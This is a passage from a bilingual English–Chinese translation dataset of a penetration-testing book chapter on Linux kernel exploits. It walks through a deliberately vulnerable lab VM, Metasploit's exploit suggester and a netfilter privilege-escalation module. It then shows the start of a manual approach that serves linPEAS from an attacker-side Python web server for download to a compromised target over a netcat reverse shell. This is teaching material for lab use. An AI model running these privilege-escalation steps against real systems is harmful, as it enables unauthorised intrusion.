- en: '*Chapter 10*: Linux Kernel Exploits'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第10章*：Linux内核漏洞'
- en: Now that you have a functional understanding of how to elevate your privileges
    on Windows systems, we can begin exploring the process of elevating our privileges
    on Linux systems. The first privilege escalation attack vector we will be exploring
    in this chapter is kernel exploitation.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，你已经对如何在Windows系统上提升特权有了基本了解，我们可以开始探索如何在Linux系统上提升特权。本章中，我们将探索的第一个特权提升攻击向量是内核漏洞利用。
- en: In this chapter, you will learn how to identify, transfer, and utilize kernel
    exploits on Linux both manually and automatically. This process will mirror the
    same methodology we used in [*Chapter 5*](B17389_05_Final_PG_ePub.xhtml#_idTextAnchor075),
    *Windows Kernel Exploits*, where we explored the kernel exploitation process on
    Windows.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 本章中，你将学习如何手动和自动地识别、传输和利用Linux上的内核漏洞。这个过程将与我们在[*第5章*](B17389_05_Final_PG_ePub.xhtml#_idTextAnchor075)中探讨的Windows内核漏洞利用过程相类似，其中我们探讨了Windows上的内核漏洞利用过程。
- en: We will start by taking a look at how the Linux kernel works and how to identify
    kernel vulnerabilities on Linux by using local enumeration scripts. After this,
    we will explore the process of modifying, compiling, and transferring kernel exploits
    to the target system.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将从了解Linux内核的工作原理以及如何通过使用本地枚举脚本识别Linux上的内核漏洞开始。之后，我们将探讨修改、编译和传输内核漏洞到目标系统的过程。
- en: 'In this chapter, we''re going to cover the following main topics:'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 本章我们将讨论以下主要内容：
- en: Understanding the Linux kernel
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 理解Linux内核
- en: Kernel exploitation with Metasploit
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Metasploit进行内核漏洞利用
- en: Manual kernel exploitation
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 手动内核漏洞利用
- en: Technical requirements
  id: totrans-8
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: To follow along with the demonstrations in this chapter, you will need to ensure
    that you have familiarity with Linux Terminal commands.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 要跟随本章的演示，你需要确保你熟悉Linux终端命令。
- en: 'You can view this chapter''s code in action here: [https://bit.ly/3igFnys](https://bit.ly/3igFnys)'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以在这里查看本章的代码示例：[https://bit.ly/3igFnys](https://bit.ly/3igFnys)
- en: Understanding the Linux kernel
  id: totrans-11
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 理解Linux内核
- en: You should already have a good idea of how a kernel works as we took an in-depth
    look at the structure, purpose, and functionality of a kernel in [*Chapter 5*](B17389_05_Final_PG_ePub.xhtml#_idTextAnchor075),
    *Windows Kernel Exploits*. As a result, we will only be focusing on the structure
    of the Linux kernel and how it works in this chapter.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 你应该已经对内核的工作原理有了清晰的了解，因为我们在[*第5章*](B17389_05_Final_PG_ePub.xhtml#_idTextAnchor075)中深入探讨了内核的结构、目的和功能。因此，本章我们只会关注Linux内核的结构及其工作原理。
- en: The Linux kernel is a Unix-like open source, monolithic, and modular operating
    system kernel that was created in 1991 by Linus Torvalds, and was later implemented
    as the primary kernel for the GNU operating system. This combination of the Linux
    kernel and the GNU toolchain has led to the development of a plethora of operating
    systems that use the Linux kernel. These are commonly referred to as Linux distributions.
    A Linux distribution is an operating system that utilizes the Linux kernel and
    pairs it with various tools and utilities to cater to a particular use case or
    industry.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: Linux内核是一个类Unix的开源、单体化和模块化的操作系统内核，最初由Linus Torvalds于1991年创建，后来成为GNU操作系统的主要内核。Linux内核与GNU工具链的结合，促成了大量使用Linux内核的操作系统的发展，这些操作系统通常被称为Linux发行版。Linux发行版是利用Linux内核，并将其与各种工具和实用程序配对，以满足特定用例或行业的操作系统。
- en: 'Similar to Windows NT, the Linux kernel consists of two main modes of operation
    that determine access to system resources and hardware:'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 与Windows NT类似，Linux内核由两种主要的操作模式组成，这决定了对系统资源和硬件的访问：
- en: '**User space**: User space is a sector of unprivileged segregated memory that''s
    reserved for user programs and services that run outside the operating system
    kernel. By default, the services are segregated from the kernel and, as a result,
    will have limited privileges.'
  id: totrans-15
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**用户空间**：用户空间是一个不具特权的、隔离的内存区域，专门用于运行操作系统内核外的用户程序和服务。默认情况下，服务与内核隔离，因此其特权有限。'
- en: '**Kernel space**: The kernel space is a privileged sector of segregated memory
    that''s reserved for running the kernel. The kernel space is privileged, given
    the nature of the processes and functionality the kernel is responsible for handling.'
  id: totrans-16
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**内核空间**：内核空间是一个特权的、隔离的内存区域，用于运行内核。由于内核负责处理的进程和功能的性质，内核空间具有特权。'
- en: 'As illustrated in the following diagram, the two main modes of operation are
    used to segregate access to resources and hardware:'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 如下图所示，使用两种主要操作模式来隔离资源和硬件的访问：
- en: '![Figure 10.1 – Linux kernel structure'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: '![图10.1 – Linux内核结构'
- en: '](Images/B17389_10_001.jpg)'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_001.jpg)'
- en: Figure 10.1 – Linux kernel structure
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.1 – Linux内核结构
- en: User space applications and services can communicate with the kernel space through
    the use of system calls, as illustrated in the preceding diagram. The interaction
    between the user space and kernel space is facilitated through the GNU C library
    and, consequently, the system call interface.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 用户空间的应用程序和服务可以通过使用系统调用与内核空间进行通信，如前面的图示所示。用户空间和内核空间之间的交互是通过GNU C库来实现的，因此，系统调用接口也承担着这一职能。
- en: The system call interface is responsible for handling system calls from user
    space into the kernel.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 系统调用接口负责处理来自用户空间到内核的系统调用。
- en: The kernel space has full access to the system's hardware and resources and
    is responsible for managing system services and system calls from the user space.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 内核空间可以完全访问系统的硬件和资源，并负责管理系统服务以及来自用户空间的系统调用。
- en: Understanding the Linux kernel exploitation process
  id: totrans-24
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 理解Linux内核漏洞利用过程
- en: The Linux kernel is vulnerable to various attacks that can lead to exploitation
    or privilege escalation. In this chapter, we will primarily be focusing on how
    to correctly identify and exploit vulnerabilities in the Linux kernel to elevate
    our privileges.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: Linux内核容易受到各种攻击，这些攻击可能导致漏洞利用或权限提升。在本章中，我们将主要关注如何正确识别并利用Linux内核中的漏洞来提升我们的权限。
- en: Given the fact that the kernel runs in the privileged kernel space, any vulnerability
    in the kernel that allows arbitrary code to be executed will run in a privileged
    state and, as a result, provide us with an elevated session.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 考虑到内核在特权内核空间中运行，任何允许执行任意代码的内核漏洞将以特权状态运行，从而为我们提供一个提升的会话。
- en: This process will follow a two-pronged approach that will encompass the process
    of utilizing kernel exploits both manually and automatically.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 这个过程将采取双管齐下的方法，涵盖手动和自动利用内核漏洞的过程。
- en: Kernel exploits on Linux will typically target vulnerabilities in the Linux
    kernel to execute arbitrary code. This will help with running privileged system
    commands or obtaining a system shell. This process will differ based on the version
    of the Linux kernel being targeted and the kernel exploit being used.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: Linux上的内核漏洞利用通常针对Linux内核中的漏洞，以执行任意代码。这有助于运行特权系统命令或获得系统shell。这个过程将根据目标Linux内核的版本和使用的内核漏洞利用方式有所不同。
- en: In this chapter, we will need to set up an Ubuntu 16.04 target virtual machine
    in our virtual hacking lab.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将需要在虚拟黑客实验室中设置一个Ubuntu 16.04目标虚拟机。
- en: We can begin the kernel exploitation process with the Metasploit framework,
    which will allow us to automate the process of identifying and exploiting kernel
    vulnerabilities on Windows.
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用Metasploit框架开始内核漏洞利用过程，这将使我们能够自动化在Windows上识别和利用内核漏洞的过程。
- en: Setting up our environment
  id: totrans-31
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 设置我们的环境
- en: In this chapter, we will be utilizing a customized Ubuntu 16.04 virtual machine
    that has been configured to be vulnerable. This will provide us with a robust
    environment to learn about and demonstrate kernel exploitation.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将使用一个经过定制的Ubuntu 16.04虚拟机，该虚拟机已被配置为存在漏洞。这将为我们提供一个强大的环境来学习和演示内核漏洞利用。
- en: 'To start setting up the virtual machine, follow these steps:'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 要开始设置虚拟机，请按照以下步骤操作：
- en: The first step in this process involves downloading the virtual machine files
    required to set up the target system with VirtualBox. The necessary file can be
    downloaded from [https://download.vulnhub.com/stapler/Stapler.zip](https://download.vulnhub.com/stapler/Stapler.zip).
  id: totrans-34
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 该过程的第一步是下载用于通过VirtualBox设置目标系统的虚拟机文件。必要的文件可以从[https://download.vulnhub.com/stapler/Stapler.zip](https://download.vulnhub.com/stapler/Stapler.zip)下载。
- en: After downloading the ZIP file, you will need to extract its contents. You should
    be presented with a folder that contains the **open virtualization format** (**OVF**)
    and **virtual machine disk** (**VMDK**) files, which are required to run the virtual
    machine, as highlighted in the following screenshot:![Figure 10.2 – Virtual machine
    files
  id: totrans-35
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载ZIP文件后，您需要解压其内容。您将看到一个文件夹，其中包含**开放虚拟化格式**（**OVF**）和**虚拟机磁盘**（**VMDK**）文件，这些文件是运行虚拟机所必需的，如下图所示：![图10.2
    – 虚拟机文件
- en: '](Images/B17389_10_002.jpg)'
  id: totrans-36
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_002.jpg)'
- en: Figure 10.2 – Virtual machine files
  id: totrans-37
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.2 – 虚拟机文件
- en: To import the virtual machine into VirtualBox, you will need to double-click
    the **Stapler.ovf** file. You will be prompted with the VirtualBox import wizard,
    as illustrated in the following screenshot:![Figure 10.3 – VirtualBox import wizard
  id: totrans-38
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要将虚拟机导入 VirtualBox，您需要双击 **Stapler.ovf** 文件。您将看到 VirtualBox 导入向导，如下图所示：![图 10.3
    – VirtualBox 导入向导
- en: '](Images/B17389_10_003.jpg)'
  id: totrans-39
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_003.jpg)'
- en: Figure 10.3 – VirtualBox import wizard
  id: totrans-40
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.3 – VirtualBox 导入向导
- en: The VirtualBox import wizard will prompt you to specify the virtual machine
    base folder, as highlighted in the preceding screenshot. After doing this, you
    can click on the **Import** button to begin the import process.
  id: totrans-41
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: VirtualBox 导入向导将提示您指定虚拟机的基础文件夹，如前述截图所示。完成此操作后，您可以点击 **导入** 按钮开始导入过程。
- en: 'Once the virtual machine has been imported into VirtualBox, you will need to
    add it to the **Virtual Hacking Lab** network we created in [*Chapter 2*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030),
    *Setting Up Our Lab*, as highlighted in the following screenshot:'
  id: totrans-42
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦虚拟机已导入到 VirtualBox，您需要将其添加到我们在[*第二章*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030)中创建的
    **虚拟黑客实验室** 网络，如以下截图所示：
- en: '![Figure 10.4 – VirtualBox network settings'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.4 – VirtualBox 网络设置'
- en: '](Images/B17389_10_004.jpg)'
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_004.jpg)'
- en: Figure 10.4 – VirtualBox network settings
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.4 – VirtualBox 网络设置
- en: Once you have configured the virtual machine to use the custom network, you
    can save the changes and boot up the VM to get started.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 配置虚拟机使用自定义网络后，您可以保存更改并启动虚拟机以开始操作。
- en: Note
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: 'You will require an initial foothold on the system to follow along with the
    techniques and demonstrations in this chapter. The following exploitation guide
    highlights the process of retrieving a meterpreter session on the target VM: [https://download.vulnhub.com/stapler/slides.pdf](https://download.vulnhub.com/stapler/slides.pdf).'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 您需要在系统中获得初步访问权限，以便跟随本章中的技术和演示。以下利用指南说明了如何在目标虚拟机上获取 meterpreter 会话：[https://download.vulnhub.com/stapler/slides.pdf](https://download.vulnhub.com/stapler/slides.pdf)。
- en: Now that we have set up our environment and target virtual machine, we can begin
    the privilege escalation process with Metasploit.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经设置好环境和目标虚拟机，可以开始使用 Metasploit 进行权限提升过程。
- en: Kernel exploitation with Metasploit
  id: totrans-50
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用 Metasploit 进行内核利用
- en: We can begin the kernel exploitation process by taking a look at how to use
    kernel exploits with the **Metasploit** framework. The Metasploit framework offers
    an automated and modularized solution and streamlines the exploitation process.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过查看如何使用 **Metasploit** 框架进行内核利用来开始内核利用过程。Metasploit 框架提供了自动化和模块化的解决方案，简化了利用过程。
- en: 'For this section, our target system will be the Ubuntu 16.04 virtual machine.
    As a prerequisite, ensure that you have gained your initial foothold on the system
    and have a **meterpreter** session:'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们的目标系统将是 Ubuntu 16.04 虚拟机。作为前提条件，请确保您已在系统上获得初步的访问权限，并且拥有一个 **meterpreter**
    会话：
- en: The first step involves scanning the target for potential exploits. For this,
    we will be using the **local_exploit_suggester** module. This process was covered
    in depth in the previous chapter.
  id: totrans-53
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 第一项任务是扫描目标以寻找潜在的漏洞。为此，我们将使用 **local_exploit_suggester** 模块。此过程在前一章节中已经详细讨论过。
- en: 'We can load the module in Metasploit by running the following command:'
  id: totrans-54
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过运行以下命令在 Metasploit 中加载模块：
- en: '**use post/multi/recon/local_exploit_suggester**'
  id: totrans-55
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**使用 post/multi/recon/local_exploit_suggester**'
- en: 'After loading the module, you will need to set the **SESSION** option for the
    module. The **SESSION** option requires the session ID of your meterpreter session.
    This can be done by running the following command:'
  id: totrans-56
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 加载模块后，您需要为该模块设置 **SESSION** 选项。**SESSION** 选项需要您的 meterpreter 会话的会话 ID。可以通过运行以下命令来完成：
- en: '**set SESSION <SESSION-ID>**'
  id: totrans-57
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**设置 SESSION <SESSION-ID>**'
- en: 'As illustrated in the following screenshot, the **SESSION** option should reflect
    the session ID you set:'
  id: totrans-58
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，**SESSION** 选项应显示您设置的会话 ID：
- en: '![Figure 10.5 – local_exploit_suggester options'
  id: totrans-59
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 10.5 – local_exploit_suggester 选项'
- en: '](Images/B17389_10_005.jpg)'
  id: totrans-60
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_005.jpg)'
- en: Figure 10.5 – local_exploit_suggester options
  id: totrans-61
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.5 – local_exploit_suggester 选项
- en: 'After configuring the module options, we can run the module by running the
    following command:'
  id: totrans-62
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 配置好模块选项后，我们可以通过运行以下命令来启动模块：
- en: '**run**'
  id: totrans-63
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**运行**'
- en: 'This will begin the scanning process, during which the module will begin to
    output the various exploits that the target is potentially vulnerable to, as highlighted
    in the following screenshot:'
  id: totrans-64
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这将开始扫描过程，在此过程中，模块将开始输出目标可能存在的各种漏洞，正如以下截图所示：
- en: '![Figure 10.6 – local_exploit_suggester results'
  id: totrans-65
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图10.6 – local_exploit_suggester结果'
- en: '](Images/B17389_10_006.jpg)'
  id: totrans-66
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_006.jpg)'
- en: Figure 10.6 – local_exploit_suggester results
  id: totrans-67
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图10.6 – local_exploit_suggester结果
- en: 'Now, we can begin testing the various exploit modules recommended by **local_exploit_suggester**.
    The first few modules in the output usually have a higher chance of working successfully.
    We can test the second module in the list, as highlighted in the preceding screenshot,
    by loading the module. This can be done by running the following command:'
  id: totrans-68
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们可以开始测试**local_exploit_suggester**推荐的各种漏洞利用模块。输出中的前几个模块通常有更高的成功几率。我们可以通过加载模块来测试列表中的第二个模块，正如前面的截图所示。可以通过运行以下命令来完成此操作：
- en: '**use /exploit/linux/local/netfilter_priv_esc_ipv4**'
  id: totrans-69
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**使用 /exploit/linux/local/netfilter_priv_esc_ipv4**'
- en: 'This kernel exploit will exploit a **netfilter** bug on Linux kernels before
    version 4.6.3 and requires **iptables** to be enabled and loaded. The exploit
    also requires **libc6-dev-i386** for compiling the exploit. More information regarding
    this exploit can be found here: [https://www.rapid7.com/db/modules/exploit/linux/local/netfilter_priv_esc_ipv4/](https://www.rapid7.com/db/modules/exploit/linux/local/netfilter_priv_esc_ipv4/).'
  id: totrans-70
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 此内核漏洞利用将利用Linux内核版本低于4.6.3的**netfilter** bug，并要求启用并加载**iptables**。该漏洞利用还要求安装**libc6-dev-i386**来编译漏洞利用程序。有关此漏洞利用的更多信息，请参阅：[https://www.rapid7.com/db/modules/exploit/linux/local/netfilter_priv_esc_ipv4/](https://www.rapid7.com/db/modules/exploit/linux/local/netfilter_priv_esc_ipv4/)。
- en: After loading the module, you will need to set the module options, which will
    include the meterpreter session ID and the payload options for the new meterpreter
    session, as highlighted in the following screenshot:![Figure 10.7 – Kernel exploit
    module options](Images/B17389_10_007.jpg)
  id: totrans-71
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 加载模块后，您需要设置模块选项，这些选项将包括meterpreter会话ID和新meterpreter会话的有效负载选项，正如以下截图所示：![图10.7
    – 内核漏洞利用模块选项](Images/B17389_10_007.jpg)
- en: Figure 10.7 – Kernel exploit module options
  id: totrans-72
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图10.7 – 内核漏洞利用模块选项
- en: 'We can now run the kernel exploit module by running the following command:'
  id: totrans-73
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们现在可以通过运行以下命令来执行内核漏洞利用模块：
- en: '**exploit**'
  id: totrans-74
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**漏洞利用**'
- en: 'In this case, the exploit was unsuccessful because **libc6-dev-i386** is not
    installed, as seen in the following screenshot:'
  id: totrans-75
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这种情况下，漏洞利用失败是因为**libc6-dev-i386**未安装，如以下截图所示：
- en: '![Figure 10.8 – Metasploit kernel exploit failed'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: '![图10.8 – Metasploit内核漏洞利用失败'
- en: '](Images/B17389_10_008.jpg)'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_008.jpg)'
- en: Figure 10.8 – Metasploit kernel exploit failed
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.8 – Metasploit内核漏洞利用失败
- en: 'Alternatively, running the other kernel exploits suggested by **local_exploit_suggester**
    will fail. This is an important lesson to learn: you cannot always rely on using
    automated Metasploit modules to gain access or elevate your privileges on the
    target system. Trial and error is a big part of the privilege escalation process.'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 另外，运行**local_exploit_suggester**建议的其他内核漏洞利用将失败。这是一个重要的教训：您不能总是依赖使用自动化的Metasploit模块来获得访问权限或提升目标系统的权限。试错是权限提升过程中一个重要的部分。
- en: Given that this path has not yielded any results, we will need to take a more
    manual hands-on approach in identifying the correct kernel exploit to use. Let's
    begin by taking a look at how to enumerate relevant information from the target
    system with various enumeration scripts.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 由于此路径未能产生任何结果，我们需要采用更手动的方式来识别正确的内核漏洞利用方法。让我们从查看如何通过各种枚举脚本列举目标系统的相关信息开始。
- en: Manual kernel exploitation
  id: totrans-81
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 手动内核漏洞利用
- en: In some cases, you will not be successful in using Metasploit modules to elevate
    your privileges, you may not have access to a target with a meterpreter session,
    or you may have exploited the target through a manual exploitation technique such
    as a web shell. In that case, you will have access through a standard reverse
    shell, most likely facilitated through **netcat**. This poses a few issues; how
    can you scan the target for potential kernel exploits? And how can you transfer
    over the kernel exploit to the target?
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 在某些情况下，您可能无法成功使用Metasploit模块提升权限，可能无法访问带有meterpreter会话的目标，或者您可能通过手动漏洞利用技术（例如Web
    Shell）利用了目标。在这种情况下，您将通过标准反向Shell进行访问，通常是通过**netcat**来实现的。这带来了一些问题：您如何扫描目标以寻找潜在的内核漏洞？以及如何将内核漏洞传输到目标？
- en: These are the issues we will be addressing in this section; our target of choice
    will be the Ubuntu 16.04 virtual machine we set up earlier in this chapter.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 这些是我们将在本节中解决的问题；我们选择的目标是本章早些时候设置的 Ubuntu 16.04 虚拟机。
- en: Local enumeration tools
  id: totrans-84
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 本地枚举工具
- en: The first step is to scan and identify potential kernel vulnerabilities. This
    can be done by using **linux-exploit-suggester** or other enumeration scripts
    and tools. In this case, we will utilize the **linPEAS** script to enumerate information
    from our target.
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 第一步是扫描并识别潜在的内核漏洞。这可以通过使用 **linux-exploit-suggester** 或其他枚举脚本和工具来完成。在本例中，我们将利用
    **linPEAS** 脚本来枚举目标信息。
- en: Note
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: linPEAS is a local Linux enumeration script that searches and scans for potential
    vulnerabilities, and then enumerates all important system information that can
    be used to stage a privilege escalation attack.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: linPEAS 是一个本地的 Linux 枚举脚本，用于搜索和扫描潜在的漏洞，然后枚举所有可用于进行权限提升攻击的重要系统信息。
- en: 'The **linPEAS** binary can be downloaded from the following GitHub repository:
    [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: '**linPEAS** 二进制文件可以从以下 GitHub 仓库下载：[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)。'
- en: 'Ensure you download the **linpeas** Bash script, as highlighted in the following
    screenshot:'
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 请确保下载 **linpeas** Bash 脚本，如以下截图所示：
- en: '![Figure 10.9 – linPEAS Bash script'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.9 – linPEAS Bash 脚本'
- en: '](Images/B17389_10_009.jpg)'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_009.jpg)'
- en: Figure 10.9 – linPEAS Bash script
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.9 – linPEAS Bash 脚本
- en: After downloading the Bash script to our Kali VM, we need to transfer the **linpeas.sh**
    file to our target virtual machine. This cannot be done automatically as we do
    not have a meterpreter session. As a result, we will need to make use of Linux-specific
    utilities to download the binary.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 在将 Bash 脚本下载到我们的 Kali 虚拟机后，我们需要将**linpeas.sh**文件传输到目标虚拟机。这无法自动完成，因为我们没有 meterpreter
    会话。因此，我们需要利用 Linux 特有的工具来下载二进制文件。
- en: Transferring files
  id: totrans-94
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 文件传输
- en: 'To transfer the **linpeas.sh** file to our target, we will need to set up a
    web server on our Kali VM. This will be used to host the file so that we can download
    it on the target system. This can be done by following these steps:'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 为了将**linpeas.sh**文件传输到我们的目标，我们需要在 Kali 虚拟机上搭建一个 Web 服务器。这个服务器将用来托管文件，以便我们可以在目标系统上下载它。可以通过以下步骤来完成：
- en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
    Python module to serve the binary file. This can be done by running the following
    command in the directory where the **linpeas.sh** binary is stored:'
  id: totrans-96
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了在 Kali 虚拟机上设置 Web 服务器，我们可以使用 **SimpleHTTPServer** Python 模块来提供二进制文件。可以通过在存储
    **linpeas.sh** 二进制文件的目录中运行以下命令来完成：
- en: '**sudo python -m SimpleHTTPServer 80**'
  id: totrans-97
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo python -m SimpleHTTPServer 80**'
- en: Note
  id: totrans-98
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 注意
- en: You can also use any other open port on your system if port **80** is being
    used.
  id: totrans-99
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果端口 **80** 已被占用，您还可以使用系统上的任何其他开放端口。
- en: 'Alternatively, you can utilize the Python 3 **http.server** module by running
    the following command:'
  id: totrans-100
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 另外，您还可以通过运行以下命令，利用 Python 3 的 **http.server** 模块：
- en: '**sudo python3 -m http.server 80**'
  id: totrans-101
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo python3 -m http.server 80**'
- en: 'As highlighted in the following screenshot, **SimpleHTTPServer** will serve
    the files in the directory on the Kali VM IP address on port **80**:'
  id: totrans-102
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 正如以下截图所示，**SimpleHTTPServer** 将在 Kali 虚拟机 IP 地址的 **80** 端口上提供目录中的文件：
- en: '![Figure 10.10 – SimpleHTTPServer linpeas.sh'
  id: totrans-103
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 10.10 – SimpleHTTPServer linpeas.sh'
- en: '](Images/B17389_10_010.jpg)'
  id: totrans-104
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_010.jpg)'
- en: Figure 10.10 – SimpleHTTPServer linpeas.sh
  id: totrans-105
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.10 – SimpleHTTPServer linpeas.sh
- en: To download the **linpeas.sh** file on to the target system, we can utilize
    the **wget** utility. Before we can download the binary, however, we need to navigate
    to a directory where we have read and write permissions. In this case, we will
    navigate to the temporary directory, as illustrated in the following screenshot:![Figure
    10.11 – Linux temp directory
  id: totrans-106
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了将 **linpeas.sh** 文件下载到目标系统，我们可以利用 **wget** 工具。然而，在下载二进制文件之前，我们需要导航到一个我们有读写权限的目录。在这种情况下，我们将导航到临时目录，如以下截图所示：![图
    10.11 – Linux 临时目录
- en: '](Images/B17389_10_011.jpg)'
  id: totrans-107
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_011.jpg)'
- en: Figure 10.11 – Linux temp directory
  id: totrans-108
